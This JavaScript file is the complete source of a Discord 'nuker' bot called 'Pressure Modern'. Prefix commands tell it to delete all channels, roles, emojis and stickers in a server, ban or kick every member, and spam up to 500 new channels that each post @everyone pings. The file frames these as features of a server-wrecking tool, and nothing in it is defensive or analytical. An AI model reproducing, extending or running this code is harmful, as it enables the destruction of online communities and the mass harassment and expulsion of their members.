/**
 * Modern Rewrite
 * @author spid3r - modern
 * @author 7teen  - Beta
 */
const { Client, Intents, MessageEmbed } = require("discord.js");
const { red, greenBright, cyan, yellow } = require("chalk");
const { token, prefix, userID, disableEveryone } = require("../config/config.json");

const nuker = new Client({ intents: Object.values(Intents.FLAGS).reduce((a, b) => a + b) });

nuker.once("ready", () => {
    console.clear();
    console.log(red(`
██████╗ ██████╗ ███████╗███████╗███████╗██╗   ██╗██████╗ ███████╗
██╔══██╗██╔══██╗██╔════╝██╔════╝██╔════╝██║   ██║██╔══██╗██╔════╝
██████╔╝██████╔╝█████╗  ███████╗███████╗██║   ██║██████╔╝█████╗  
██╔═══╝ ██╔══██╗██╔══╝  ╚════██║╚════██║██║   ██║██╔══██╗██╔══╝  
██║     ██║  ██║███████╗███████║███████║╚██████╔╝██║  ██║███████╗
╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
                                                                 
                    Nuker: ${nuker.user.tag}
                    Prefix: ${prefix}
    `));
    nuker.user.setActivity({ name: "Pressure Modern", type: "PLAYING" });
});

nuker.on("messageCreate", async (message) => {
    if (!message.guild || message.author.bot) return;

    const perms = {
        channel: message.guild.me.permissions.has(["MANAGE_CHANNELS", "ADMINISTRATOR"]),
        ban: message.guild.me.permissions.has(["BAN_MEMBERS", "ADMINISTRATOR"]),
        kick: message.guild.me.permissions.has(["KICK_MEMBERS", "ADMINISTRATOR"]),
        role: message.guild.me.permissions.has(["MANAGE_ROLES", "ADMINISTRATOR"]),
        emote: message.guild.me.permissions.has(["MANAGE_EMOJIS_AND_STICKERS", "ADMINISTRATOR"])
    };

    const args = message.content.split(" ").slice(1);
    const amount = parseInt(args[0]);
    const nameArg = args.slice(1).join(" ");
    const pingMsg = args.slice(2).join(", ");

    const help = new MessageEmbed()
        .setDescription(`**Presser Modern ;**
    \n**mass channels ;**
    ${prefix}mc [amount] (text) i.e \`${prefix}mc 5 test\`\n
    **mass channel n ping ;**
    ${prefix}cp [amount] (text), {message} i.e \`${prefix}cp 5 test, testing\`\n
    **mass roles ;**
    ${prefix}mr [amount] (text) i.e \`${prefix}mr 5 test\`\n
    **delete channels ;**
    ${prefix}dc\n
    **delete roles ;**
    ${prefix}dr\n
    **delete emotes ;**
    ${prefix}de\n
    **delete stickers (new) ;**
    ${prefix}ds\n
    **mass kick ;**
    ${prefix}mk\n
    **mass ban ;**
    ${prefix}mb
    `)
        .setFooter({ text: `Pressure Modern` })
        .setColor(0x36393E)
        .setTimestamp();

    const isOwner = message.author.id === userID;
    const canUse = !disableEveryone || isOwner;

    if (!canUse) return message.reply("unauthorised attempt to use the bot.");

    try {
        if (message.content.startsWith(prefix + "help")) {
            return message.channel.send({ embeds: [help] });
        }
        if (message.content.startsWith(prefix + "mc")) {
            await massChannels(amount, nameArg, perms.channel, message);
            return message.reply("Channels created.");
        }
        if (message.content.startsWith(prefix + "cp")) {
            await massChannelsPing(amount, nameArg, pingMsg, perms.channel, message);
            return message.reply("Channels created and pinged.");
        }
        if (message.content.startsWith(prefix + "dc")) {
            await deleteAllChannels(perms.channel, message);
            return message.reply("All channels deleted.");
        }
        if (message.content.startsWith(prefix + "mr")) {
            await massRoles(amount, nameArg, perms.role, message);
            return message.reply("Roles created.");
        }
        if (message.content.startsWith(prefix + "dr")) {
            await deleteAllRoles(perms.role, message);
            return message.reply("All roles deleted.");
        }
        if (message.content.startsWith(prefix + "de")) {
            await deleteAllEmotes(perms.emote, message);
            return message.reply("All emotes deleted.");
        }
        if (message.content.startsWith(prefix + "ds")) {
            await deleteAllStickers(perms.emote, message);
            return message.reply("All stickers deleted.");
        }
        if (message.content.startsWith(prefix + "mb")) {
            await banAll(perms.ban, message);
            return message.reply("Ban process started.");
        }
        if (message.content.startsWith(prefix + "mk")) {
            await kickAll(perms.kick, message);
            return message.reply("Kick process started.");
        }
    } catch (err) {
        message.reply(err.toString());
    }
});


async function massChannels(amount, channelName, hasPerm, message) {
    if (!amount) throw "Unspecified Args: Specify the amount you wish to mass channels";
    if (isNaN(amount)) throw "Type Error: Use a number for the amount";
    if (amount > 500) throw "Amount Error: Max guild channel size is 500";
    if (!hasPerm) throw "ERROR: 'MANAGE_CHANNELS' permission is missing";
    for (let i = 0; i < amount; i++) {
        if (message.guild.channels.cache.size >= 500) break;
        try {
            await message.guild.channels.create(channelName || `${message.author.username} was here`, { type: "GUILD_TEXT" });
        } catch (err) {
            console.log(red("Error Found: " + err));
        }
    }
}

async function massChannelsPing(amount, channelName, pingMessage, hasPerm, message) {
    if (!amount) throw "Unspecified Args: Specify the amount you wish to mass channels";
    if (isNaN(amount)) throw "Type Error: Use a number for the amount";
    if (amount > 500) throw "Amount Error: Max guild channel size is 500 | Tip: Use a number lower than 500";
    if (!hasPerm) throw "ERROR: 'MANAGE_CHANNELS' missing permissions";
    if (!pingMessage) throw "Unspecified Args: Specify the message you wish to mass mention";
    for (let i = 0; i < amount; i++) {
        if (message.guild.channels.cache.size >= 500) break;
        try {
            const ch = await message.guild.channels.create(channelName || `${message.author.username} was here`, { type: "GUILD_TEXT" });
            await ch.send("@everyone " + pingMessage);
        } catch (err) {
            console.log(red("Error Found: " + err));
        }
    }
}

async function deleteAllChannels(hasPerm, message) {
    if (!hasPerm) throw "Bot Missing Permissions: 'MANAGE_CHANNELS'";
    for (const ch of message.guild.channels.cache.values()) {
        try {
            await ch.delete();
        } catch (err) {
            console.log(red("Error Found: " + err));
        }
    }
}

async function massRoles(amount, roleName, hasPerm, message) {
    if (!amount) throw "Unspecified Args: Specify the amount you wish to mass roles";
    if (isNaN(amount)) throw "Type Error: Use a number for the amount";
    if (!hasPerm) throw "ERROR: 'MANAGE_ROLES' missing permissions";
    for (let i = 0; i < amount; i++) {
        if (message.guild.roles.cache.size >= 250) break;
        try {
            await message.guild.roles.create({
                name: roleName || "spid3r",
                color: "RANDOM",
                position: i
            });
        } catch (err) {
            console.log(red("Error Found: " + err));
        }
    }
}

async function deleteAllRoles(hasPerm, message) {
    if (!hasPerm) throw "ERROR: 'MANAGE_ROLES' missing permissions";
    for (const role of message.guild.roles.cache.values()) {
        if (!role.editable || role.id === message.guild.id) continue;
        try {
            await role.delete();
        } catch (err) {
            console.log(red("Error Found: " + err));
        }
    }
}

async function deleteAllEmotes(hasPerm, message) {
    if (!hasPerm) throw "ERROR: 'MANAGE_EMOJIS_AND_STICKERS' missing permissions";
    for (const emoji of message.guild.emojis.cache.values()) {
        try {
            await emoji.delete();
        } catch (err) {
            console.log(red("Error Found: " + err));
        }
    }
}

async function deleteAllStickers(hasPerm, message) {
    if (!hasPerm) throw "ERROR: 'MANAGE_EMOJIS_AND_STICKERS' missing permissions";
    for (const sticker of message.guild.stickers.cache.values()) {
        try {
            await sticker.delete();
        } catch (err) {
            console.log(red("Error Found: " + err));
        }
    }
}

async function banAll(hasPerm, message) {
    if (!hasPerm) throw "ERROR: 'BAN_MEMBERS' missing permissions";
    const members = message.guild.members.cache.filter(m => m.bannable && !m.user.bot);
    message.reply(`Found ${members.size} users. Banning...`);
    for (const member of members.values()) {
        try {
            await member.ban();
            console.log(greenBright(`${member.user.tag} was banned.`));
        } catch (err) {
            console.log(red("Error Found: " + err));
        }
    }
}

async function kickAll(hasPerm, message) {
    if (!hasPerm) throw "ERROR: 'KICK_MEMBERS' missing permissions";
    const members = message.guild.members.cache.filter(m => m.kickable && !m.user.bot);
    message.reply(`Found ${members.size} users. Kicking...`);
    for (const member of members.values()) {
        try {
            await member.kick();
            console.log(greenBright(`${member.user.tag} was kicked.`));
        } catch (err) {
            console.log(red("Error Found: " + err));
        }
    }
}

nuker.login(token).catch(console.error);